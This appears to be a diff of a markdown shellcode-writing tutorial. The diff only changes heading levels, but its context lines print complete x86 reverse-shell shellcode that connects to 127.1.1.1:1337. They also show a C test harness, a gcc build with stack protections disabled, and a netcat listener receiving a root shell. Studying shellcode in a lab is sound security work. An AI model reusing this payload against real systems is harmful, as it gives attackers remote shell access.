@@ -236,13 +236,13 @@ connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 36505
 id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-### Testing if the Shellcode works when used in another program
-#### Extracting the Shellcode Hex from the compiled binary
+## Testing if the Shellcode works when used in another program
+### Extracting the Shellcode Hex from the compiled binary
 ```console
 ./objdump2hex.sh revTcpSh
 "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xc9\x51\x53\x6a\x02\x89\xe1\xcd\x80\x96\x31\xc0\x43\x68\x7f\x01\x01\x01\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xb0\x66\xcd\x80\x87\xde\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\xcd\x80"
 ```
-#### Adding the shellcode to another program
+### Adding the shellcode to another program
 This is the C program we will use to see if our shellcode works while ran in a different host program. After modifying our program, we will compile it. 
 ```c
 #include<stdio.h>
@@ -258,17 +258,17 @@ main()
         ret();
 }
 ```
-#### Compile the C program
+### Compile the C program
 ```console
 gcc -fno-stack-protector -z execstack -o shellcode shellcode.c 
 ```
-#### Testing if our shellcode works with the program
-##### Terminal Window 1
+### Testing if our shellcode works with the program
+#### Terminal Window 1
 ```console
 root# ./shellcode 
 Shellcode Length:  80
 ```
-##### Terminal Window 2
+#### Terminal Window 2
 ```console
 root# nc.traditional -nvlp 1337
 listening on [any] 1337 ...
